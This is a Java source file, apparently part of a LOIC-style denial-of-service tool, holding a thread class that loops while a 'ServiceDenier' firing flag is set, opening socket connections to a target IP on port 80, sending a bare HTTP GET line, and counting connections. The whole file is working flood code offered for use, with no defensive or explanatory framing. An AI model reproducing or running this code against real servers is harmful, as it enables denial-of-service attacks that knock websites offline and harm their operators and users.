package genius.mohammad.loic;

import java.io.OutputStreamWriter;
import java.net.InetSocketAddress;
import java.net.Socket;

public class HTTPSocketThread implements Runnable {

	private String ip;
	private int timeout, pause;

	public static long startTime = 0;
	public static int count = 0;
	
	public HTTPSocketThread(String ip, int timeout, int pause) {
		this.ip = ip;
		this.timeout = timeout;
		this.pause = pause;
	}

	public void run() {
		count = 0;
		startTime = System.currentTimeMillis();
		Socket socket;
		while (ServiceDenier.firing) {
			try {
				socket = new Socket();
				socket.connect(new InetSocketAddress(ip, 80), timeout);
				OutputStreamWriter out = new OutputStreamWriter(socket.getOutputStream());
				out.write("GET / HTTP/1.1");
				out.close();
				socket.close();
				count++;
				Thread.sleep(pause);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
}
